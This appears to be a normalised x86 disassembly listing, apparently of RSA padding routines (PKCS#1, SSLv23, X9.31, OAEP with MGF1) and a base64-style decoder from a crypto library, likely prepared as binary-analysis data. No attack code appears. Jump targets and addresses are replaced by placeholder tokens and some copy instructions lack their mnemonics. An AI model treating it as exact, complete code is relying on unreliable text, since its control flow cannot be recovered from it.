push esi
mov [ esp + 0x1c ] eax
mov [ esp + 0xc ] ecx
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push eax
push esi
call sub_1001e7c0
add esp 0x8
pop esi
add esp 0x1c
retn
xor eax eax
pop esi
add esp 0x1c
retn
sub_10058e20
mov eax 0x1c
call sub_1001d0d0
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
push esi
lea edx [ esp + 0x10 ]
mov esi [ eax + 0x4 ]
lea eax [ esp + 0x4 ]
push eax
push esi
mov [ esp + 0x1c ] ecx
mov [ esp + 0xc ] edx
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push eax
push esi
call sub_1001e7c0
add esp 0x8
pop esi
add esp 0x1c
retn
xor eax eax
pop esi
add esp 0x1c
retn
sub_10058e70
push ebx
push ebp
push esi
push edi
push 0x6a
push r--data
push 0xc
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
mov esi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
mov [ edi ] ebx
test esi esi
mov [ edi + 0x4 ] ebp
mov [ edi + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call sub_10022ae0
add esp 0x4
cmp eax 0x2ea
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
inc [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
call sub_1001e3c0
mov [ esi + 0x8 ] eax
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push sub_10058da0
call sub_1001e440
add esp 0x4
mov [ esi + 0x4 ] eax
push edi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov [ esi + 0x8 ] edi
jmp r-xdata
push ebx
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
push edi
push esi
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
sub_10058f80
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
cmp ecx eax
jle r-xdata
jge r-xdata
push 0x46
push r--data
push 0x6e
push 0x6b
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
retn
push esi
mov esi [ esp + 0x10 ]
mov eax ecx
push edi
mov edi [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
push 0x4c
push r--data
push 0x7a
push 0x6b
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10058fe0
mov edx [ esp + 0x10 ]
push ebx
mov ebx [ esp + 0xc ]
cmp edx ebx
jle r-xdata
mov ecx ebx
push ebp
mov ebp [ esp + 0xc ]
sub ecx edx
push esi
mov esi ecx
push edi
xor eax eax
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx esi
mov esi [ esp + 0x1c ]
and ecx 0x3
[ edi ]
mov ecx edx
mov edi ebp
sub edi edx
mov eax ecx
add edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x5a
push r--data
push 0x6d
push 0x6f
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop ebx
retn
sub_10059050
mov eax [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
lea ecx [ eax - 0xb ]
push esi
cmp ebp ecx
push edi
jle r-xdata
mov ecx [ esp + 0x14 ]
sub eax ebp
sub eax 0xb
lea edi [ ecx + 0x1 ]
mov [ ecx ] 0x0
mov esi eax
mov [ edi ] 0x2
inc edi
push esi
push edi
call sub_10021900
add esp 0x8
test eax eax
jg r-xdata
push 0x49
push r--data
push 0x6e
push 0x6e
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
xor ebx ebx
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax edi
mov edx 0x3030303
mov esi [ esp + 0x1c ]
add edi 0x8
mov [ eax ] edx
mov ecx ebp
inc edi
mov [ eax + 0x4 ] edx
mov edx ecx
mov [ edi - 0x1 ] 0x0
mov eax 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ edi ] 0x0
jne r-xdata
inc edi
inc ebx
cmp ebx esi
jl r-xdata
push 0x1
push edi
call sub_10021900
add esp 0x8
test eax eax
jle r-xdata
cmp [ edi ] 0x0
je r-xdata
sub_10059100
mov eax [ esp + 0x10 ]
push esi
cmp eax 0xa
jge r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ eax + 0x1 ]
cmp edx ecx
jne r-xdata
push 0x72
push r--data
push 0x6f
push 0x72
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
push 0x77
push r--data
push 0x6b
push 0x72
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
mov ecx [ esp + 0x10 ]
mov dl [ ecx ]
lea esi [ ecx + 0x1 ]
cmp dl 0x2
jne r-xdata
dec eax
xor edx edx
test eax eax
jle r-xdata
cmp edx eax
je r-xdata
mov cl [ esi ]
inc esi
test cl cl
je r-xdata
push 0x82
push r--data
push 0x71
push 0x72
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp edx 0x8
jl r-xdata
inc edx
cmp edx eax
jl r-xdata
mov ecx 0xfffffff7
cmp ecx 0xffffffff
jne r-xdata
inc ecx
cmp ecx 0xffffffff
jl r-xdata
or ecx 0xffffffff
sub ecx edx
add eax ecx
mov ecx [ esp + 0xc ]
cmp eax ecx
jle r-xdata
push 0x8b
push r--data
push 0x73
push 0x72
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp [ ecx + esi ] 0x3
jne r-xdata
mov ecx eax
push edi
mov edi [ esp + 0xc ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
push 0x93
push r--data
push 0x6d
push 0x72
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_10059210
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x20 ]
push ebx
push ebp
push esi
lea esi [ eax - 0x1 ]
push edi
mov edi [ esp + 0x38 ]
lea ecx [ esi - 0x29 ]
cmp edi ecx
jle r-xdata
cmp esi 0x29
jge r-xdata
push 0x2d
push r--data
push 0x6e
push 0x79
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
lea eax [ esi - 0x14 ]
push 0x37
push r--data
push eax
mov [ esp + 0x1c ] eax
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x30 ] eax
test eax eax
jne r-xdata
push 0x33
push r--data
push 0x78
push 0x79
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov ebx [ esp + 0x2c ]
push 0x0
mov [ ebx ] 0x0
lea ebp [ ebx + 0x1 ]
add ebx 0x15
call sub_100254d0
mov edx [ esp + 0x44 ]
push eax
mov eax [ esp + 0x44 ]
push 0x0
push ebx
push edx
push eax
call sub_1002ad90
mov ecx esi
xor eax eax
sub ecx edi
lea edi [ ebx + 0x14 ]
sub ecx 0x29
push 0x14
mov edx ecx
push ebp
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ esp + 0x58 ]
mov eax ebx
sub eax ecx
mov edx ecx
add eax esi
mov esi [ esp + 0x54 ]
shr ecx 0x2
lea edi [ eax - 0x14 ]
mov [ eax - 0x15 ] 0x1
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_10021900
add esp 0x20
test eax eax
jg r-xdata
push 0x3a
push r--data
push 0x41
push 0x79
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
call sub_100254d0
mov edi [ esp + 0x10 ]
mov esi [ esp + 0x30 ]
push eax
push 0x14
push ebp
push edi
push esi
call sub_100595e0
add esp 0x14
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x18
retn
call sub_100254d0
push eax
push edi
push ebx
lea eax [ esp + 0x20 ]
push 0x14
push eax
call sub_100595e0
lea eax [ esp + 0x28 ]
add esp 0x14
sub eax ebp
mov ecx 0x14
mov eax ebx
sub esi ebx
mov ecx edi
mov dl [ eax + ebp ]
mov bl [ ebp ]
xor bl dl
mov [ ebp ] bl
inc ebp
dec ecx
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov dl [ esi + eax ]
xor [ eax ] dl
inc eax
dec ecx
jne r-xdata
mov esi [ esp + 0x30 ]
sub_100593b0
mov eax 0x2c
call sub_1001d0d0
mov eax [ esp + 0x40 ]
push ebx
push ebp
push esi
xor ebx ebx
xor esi esi
dec eax
push edi
cmp eax 0x29
mov [ esp + 0x10 ] ebx
jl r-xdata
push 0xaf
push r--data
push 0x79
push 0x7a
push 0x4
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
mov esi [ esp + 0x4c ]
mov edi eax
sub edi esi
mov [ esp + 0x4c ] edi
jns r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x2c
retn
push esi
call sub_1001d740
add esp 0x4
lea ebp [ eax - 0x14 ]
push 0x79
add eax ebp
push r--data
push eax
call sub_1001d4c0
add esp 0xc
cmp eax ebx
mov [ esp + 0x50 ] eax
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x4c ] ebx
mov esi eax
mov edi ebx
mov ecx edi
lea ebx [ eax + ebp ]
mov edx ecx
xor eax eax
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esp + 0x4c ]
mov ecx esi
mov esi [ esp + 0x48 ]
mov edx ecx
lea edi [ ebx + eax ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebx + 0x14 ]
call sub_100254d0
push eax
push ebp
push edi
lea eax [ esp + 0x20 ]
push 0x14
push eax
call sub_100595e0
mov esi ebx
lea ecx [ esp + 0x28 ]
add esp 0x14
xor eax eax
sub esi ecx
push 0x7c
push r--data
push 0x41
push 0x7a
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
mov bl [ esp + eax + 0x14 ]
lea ecx [ esp + eax + 0x14 ]
mov dl [ esi + ecx ]
xor bl dl
inc eax
cmp eax 0x14
mov [ ecx ] bl
jl r-xdata
call sub_100254d0
mov esi [ esp + 0x50 ]
push eax
lea eax [ esp + 0x18 ]
push 0x14
push eax
push ebp
push esi
call sub_100595e0
add esp 0x14
test ebp ebp
jle r-xdata
push 0x0
call sub_100254d0
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x58 ]
push eax
lea eax [ esp + 0x30 ]
push 0x0
push eax
push ecx
push edx
call sub_1002ad90
add esp 0x18
mov ecx 0x5
lea edi [ esp + 0x28 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov eax esi
sub edi esi
mov ecx ebp
mov esi [ esp + 0x50 ]
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
mov dl [ edi + eax ]
mov bl [ eax ]
xor bl dl
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov eax 0x14
cmp ebp eax
jle r-xdata
cmp eax ebp
je r-xdata
mov ecx [ esp + 0x50 ]
cmp [ eax + ecx ] 0x0
jne r-xdata
mov edx [ esp + 0x50 ]
cmp [ eax + edx ] 0x1
jne r-xdata
inc eax
cmp eax ebp
jl r-xdata
mov ecx [ esp + 0x44 ]
inc eax
sub ebp eax
cmp ecx ebp
jge r-xdata
mov edx [ esp + 0x50 ]
mov edi [ esp + 0x40 ]
mov ecx ebp
lea esi [ eax + edx ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
push ecx
call sub_1001d740
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
push 0xa2
push r--data
push 0x6d
push 0x7a
push 0x4
call sub_1001de60
mov ecx [ esp + 0x64 ]
add esp 0x14
or ebp 0xffffffff
push ecx
call sub_1001d740
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
sub_100595e0
mov eax 0x58
call sub_1001d0d0
push ebx
push ebp
lea eax [ esp + 0x10 ]
push edi
push eax
xor edi edi
call sub_1002aa30
mov ecx [ esp + 0x7c ]
mov ebp [ esp + 0x70 ]
add esp 0x4
xor ebx ebx
mov edx [ ecx + 0x8 ]
test ebp ebp
mov [ esp + 0x10 ] edx
jle r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_1002b000
add esp 0x4
xor eax eax
pop edi
pop ebp
pop ebx
add esp 0x58
retn
push esi
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_1002aba0
mov eax [ esp + 0x78 ]
mov ecx ebp
sub ecx edi
lea esi [ esp + 0x34 ]
mov edx ecx
add edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
add esp 0xc
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
mov edx [ esp + 0x70 ]
lea eax [ esp + 0x1c ]
add edi edx
push edi
push eax
call sub_1002aba0
add esp 0xc
mov edi esi
jmp r-xdata
mov eax ebx
mov ecx ebx
sar eax 0x18
sar ecx 0x10
mov [ esp + 0x10 ] al
mov eax [ esp + 0x7c ]
mov [ esp + 0x11 ] cl
mov edx ebx
push 0x0
lea ecx [ esp + 0x1c ]
sar edx 0x8
push eax
push ecx
mov [ esp + 0x1e ] dl
mov [ esp + 0x1f ] bl
call sub_1002aa50
mov edx [ esp + 0x84 ]
mov eax [ esp + 0x80 ]
push edx
lea ecx [ esp + 0x28 ]
push eax
push ecx
call sub_1002ab80
lea edx [ esp + 0x28 ]
push 0x4
lea eax [ esp + 0x34 ]
push edx
push eax
call sub_1002ab80
mov ecx [ esp + 0x38 ]
add esp 0x24
lea esi [ ecx + edi ]
push 0x0
cmp esi ebp
jg r-xdata
pop esi
inc ebx
cmp edi ebp
jl r-xdata
sub_100596f0
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x14 ]
lea ecx [ eax - 0xb ]
cmp ebx ecx
jle r-xdata
mov edx [ esp + 0x8 ]
sub eax ebx
push ebp
sub eax 0x3
push esi
mov [ edx ] 0x0
inc edx
mov esi eax
mov ecx esi
push edi
mov [ edx ] 0x1
inc edx
mov ebp ecx
or eax 0xffffffff
mov edi edx
add edx esi
shr ecx 0x2
[ edi ]
mov ecx ebp
mov esi [ esp + 0x1c ]
and ecx 0x3
[ edi ]
mov ecx ebx
mov [ edx ] 0x0
lea edi [ edx + 0x1 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x49
push r--data
push 0x6e
push 0x6c
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop ebx
retn
sub_10059770
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push esi
lea eax [ ecx + 0x1 ]
cmp edx eax
jne r-xdata
push 0x64
push r--data
push 0x6a
push 0x70
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
mov eax [ esp + 0x10 ]
mov dl [ eax ]
lea esi [ eax + 0x1 ]
cmp dl 0x1
jne r-xdata
lea eax [ ecx - 0x1 ]
xor ecx ecx
test eax eax
jle r-xdata
cmp ecx eax
jne r-xdata
cmp [ esi ] 0xff
jne r-xdata
cmp ecx 0x8
jge r-xdata
push 0x7a
push r--data
push 0x71
push 0x70
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc ecx
cmp ecx eax
jl r-xdata
or edx 0xffffffff
sub edx ecx
mov ecx [ esp + 0xc ]
add eax edx
cmp eax ecx
jle r-xdata
push 0x80
push r--data
push 0x67
push 0x70
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
push 0x71
push r--data
push 0x66
push 0x70
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
inc esi
jmp r-xdata
mov ecx eax
push edi
mov edi [ esp + 0xc ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
push 0x87
push r--data
push 0x6d
push 0x70
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_10059870
mov eax [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
lea ecx [ eax - 0xb ]
push esi
cmp ebp ecx
push edi
jle r-xdata
mov ecx [ esp + 0x14 ]
sub eax ebp
sub eax 0x3
lea edi [ ecx + 0x1 ]
mov [ ecx ] 0x0
mov esi eax
mov [ edi ] 0x2
inc edi
push esi
push edi
call sub_10021900
add esp 0x8
test eax eax
jg r-xdata
push 0x97
push r--data
push 0x6e
push 0x6d
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
xor ebx ebx
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi [ esp + 0x1c ]
mov ecx ebp
mov edx ecx
mov [ edi ] 0x0
inc edi
mov eax 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ edi ] 0x0
jne r-xdata
inc edi
inc ebx
cmp ebx esi
jl r-xdata
push 0x1
push edi
call sub_10021900
add esp 0x8
test eax eax
jle r-xdata
cmp [ edi ] 0x0
je r-xdata
sub_10059920
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push esi
lea eax [ ecx + 0x1 ]
cmp edx eax
jne r-xdata
push 0xbe
push r--data
push 0x6b
push 0x71
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
mov eax [ esp + 0x10 ]
mov dl [ eax ]
lea esi [ eax + 0x1 ]
cmp dl 0x2
jne r-xdata
lea eax [ ecx - 0x1 ]
xor ecx ecx
test eax eax
jle r-xdata
cmp ecx eax
jne r-xdata
mov dl [ esi ]
inc esi
test dl dl
je r-xdata
cmp ecx 0x8
jge r-xdata
push 0xcc
push r--data
push 0x71
push 0x71
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
inc ecx
cmp ecx eax
jl r-xdata
or edx 0xffffffff
sub edx ecx
mov ecx [ esp + 0xc ]
add eax edx
cmp eax ecx
jle r-xdata
push 0xd2
push r--data
push 0x67
push 0x71
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
mov ecx eax
push edi
mov edi [ esp + 0xc ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
push 0xd9
push r--data
push 0x6d
push 0x71
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_10059a00
push ebx
mov ebx [ esp + 0x14 ]
push esi
mov esi [ esp + 0x10 ]
sub esi ebx
sub esi 0x2
jns r-xdata
mov eax [ esp + 0xc ]
push edi
test esi esi
jne r-xdata
push 0x50
push r--data
push 0x6e
push 0x7f
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
pop ebx
retn
cmp esi 0x1
mov [ eax ] 0x6b
lea edx [ eax + 0x1 ]
jle r-xdata
mov [ eax ] 0x6a
lea edx [ eax + 0x1 ]
jmp r-xdata
mov [ edx ] 0xba
inc edx
lea ecx [ esi - 0x1 ]
push ebp
mov ebp ecx
mov eax 0xbbbbbbbb
mov edi edx
lea edx [ edx + esi - 0x1 ]
shr ecx 0x2
[ edi ]
mov ecx ebp
pop ebp
and ecx 0x3
[ edi ]
mov esi [ esp + 0x18 ]
mov ecx ebx
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov [ edx + ebx ] 0xcc
pop esi
pop ebx
retn
sub_10059a90
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
cmp eax edx
push esi
jne r-xdata
push 0x72
push r--data
push 0x89
push 0x80
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
mov ecx [ esp + 0x10 ]
mov al [ ecx ]
cmp al 0x6a
je r-xdata
cmp al 0x6b
lea esi [ ecx + 0x1 ]
jne r-xdata
cmp al 0x6b
jne r-xdata
lea eax [ edx - 0x2 ]
lea eax [ edx - 0x3 ]
xor edx edx
test eax eax
jle r-xdata
mov ecx eax
push edi
mov edi [ esp + 0xc ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
push 0x93
push r--data
push 0x8b
push 0x80
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub eax edx
test edx edx
jne r-xdata
mov cl [ esi ]
inc esi
cmp cl 0xba
je r-xdata
cmp [ eax + esi ] 0xcc
je r-xdata
push 0x8a
push r--data
push 0x8a
push 0x80
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp cl 0xbb
jne r-xdata
push 0x81
push r--data
push 0x8a
push 0x80
push 0x4
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
inc edx
cmp edx eax
jl r-xdata
sub_10059ba0
mov eax 0x200
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x214 ]
push esi
test ebp ebp
push edi
jne r-xdata
call sub_10061300
mov ebx [ esp + 0x218 ]
mov esi eax
cmp ebx 0x200
mov eax 0x1ff
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edi [ esp + 0x214 ]
push eax
push 0x0
push edi
push 0x0
push ebp
push esi
call sub_100613f0
mov eax [ esp + 0x238 ]
add esp 0x18
test eax eax
je r-xdata
mov eax ebx
mov ebp rw-data
push esi
call sub_10061630
push esi
mov edi eax
call sub_10061370
lea ecx [ esp + 0x18 ]
push 0x200
push ecx
call sub_10026870
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
cmp ebx 0x200
mov eax 0x1ff
jge r-xdata
push edi
push eax
lea eax [ esp + 0x18 ]
push 0x0
push eax
push 0x0
push ebp
push esi
call sub_10061510
add esp 0x1c
mov eax ebx
sub_10059c60
mov eax 0x54
call sub_1001d0d0
mov eax [ esp + 0x58 ]
push ebx
push ebp
push esi
mov ebp [ eax + 0xc ]
push edi
mov edi [ eax + 0x8 ]
xor esi esi
cmp edi 0x20
mov [ esp + 0x10 ] esi
jle r-xdata
cmp ebp 0x10
jle r-xdata
push r--data
push 0x79
push r--data
call sub_1001f8d0
cmp [ esp + 0x74 ] esi
jne r-xdata
push r--data
push 0x7a
push r--data
call sub_1001f8d0
lea eax [ esp + 0x14 ]
push eax
call sub_1002aa30
mov ecx [ esp + 0x70 ]
push esi
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_1002aa50
add esp 0x10
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn
mov ebx [ esp + 0x84 ]
jmp r-xdata
mov eax esi
inc esi
test eax eax
mov [ esp + 0x84 ] esi
je r-xdata
mov ecx [ esp + 0x78 ]
mov edx [ esp + 0x74 ]
push ecx
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_1002ab80
mov eax [ esp + 0x7c ]
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x24 ]
push ecx
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_1002ab80
add esp 0xc
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_1002aba0
mov esi [ esp + 0x88 ]
add esp 0xc
cmp esi 0x1
jbe r-xdata
push 0x8
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_1002ab80
add esp 0xc
mov ecx [ esp + 0x10 ]
xor eax eax
test edi edi
je r-xdata
dec esi
test ebp ebp
je r-xdata
cmp eax ecx
je r-xdata
mov edx [ esp + 0x6c ]
push 0x0
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_1002aa50
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x30 ]
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
call sub_1002ab80
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x3c ]
push ecx
lea eax [ esp + 0x30 ]
push edx
push eax
call sub_1002aba0
add esp 0x24
dec esi
jne r-xdata
test edi edi
jne r-xdata
cmp eax ecx
je r-xdata
mov edx [ esp + 0x80 ]
test edx edx
je r-xdata
mov eax [ esp + 0x6c ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_1002aa50
add esp 0xc
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
cmp eax ecx
je r-xdata
dec edi
inc eax
test edi edi
jne r-xdata
mov esi [ esp + 0x80 ]
mov dl [ esp + eax + 0x24 ]
mov [ esi ] dl
mov edx esi
inc edx
mov [ esp + 0x80 ] edx
mov esi [ esp + 0x84 ]
lea edx [ esp + 0x14 ]
push edx
call sub_1002b000
lea eax [ esp + 0x28 ]
push 0x40
push eax
call sub_10026870
mov ecx [ esp + 0x74 ]
add esp 0xc
mov eax [ ecx + 0x8 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
test ebx ebx
je r-xdata
dec ebp
inc eax
test ebp ebp
jne r-xdata
mov dl [ esp + eax + 0x24 ]
mov [ ebx ] dl
inc ebx
sub_10059e80
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
mov esi [ esp + 0x34 ]
push edi
mov eax [ ebp + 0x58 ]
mov ecx [ ebp ]
xor edx edx
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x5c ]
xor edi edi
cmp esi edx
mov [ esp + 0x18 ] 0xffffffff
mov [ esp + 0x20 ] edx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] eax
je r-xdata
xor eax eax
cmp ecx edx
jne r-xdata
cmp esi edx
mov [ esp + 0x1c ] edx
jle r-xdata
mov eax [ esp + 0x34 ]
mov al [ eax ]
and eax 0x7f
cmp [ eax + rw-data ] 0xf2
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x28 ] 0x50
jge r-xdata
mov edx [ esp + 0x30 ]
mov esi [ esp + 0x20 ]
pop edi
mov [ edx ] esi
mov edx [ esp + 0xc ]
mov [ ebp ] ecx
mov ecx [ esp + 0x24 ]
mov [ ebp + 0x58 ] ecx
mov [ ebp + 0x5c ] edx
pop esi
pop ebp
pop ebx
add esp 0x14
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x34 ]
xor ebx ebx
mov bl [ eax ]
inc eax
mov esi ebx
mov [ esp + 0x34 ] eax
and esi 0x7f
xor eax eax
mov al [ esi + rw-data ]
mov esi eax
or al 0x13
cmp eax 0xf3
je r-xdata
cmp esi 0xff
je r-xdata
cmp ecx 0x50
jl r-xdata
cmp ebx 0x3d
jne r-xdata
mov eax [ esp + 0x28 ]
mov [ ecx + ebp + 0x8 ] bl
inc ecx
inc eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x28 ] eax
jmp r-xdata
push r--data
push 0x106
push r--data
call sub_1001f8d0
cmp esi 0xf1
jne r-xdata
cmp [ esp + 0x18 ] 0xffffffff
jne r-xdata
cmp esi 0xf0
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x28 ] edx
cmp eax edx
jne r-xdata
inc edi
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x1c ]
mov ebx [ esp + 0x38 ]
inc eax
mov [ esp + 0x10 ] edx
cmp eax ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x28 ] edx
cmp eax edx
je r-xdata
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x38 ]
inc eax
cmp eax esi
mov [ esp + 0x1c ] eax
jl r-xdata
cmp esi 0xf2
jne r-xdata
test cl 0x3
je r-xdata
mov [ esp + 0x10 ] edx
jmp r-xdata
cmp ecx 0x40
jl r-xdata
test cl 0x3
je r-xdata
mov al [ ecx + ebp + 0x7 ]
xor edi edi
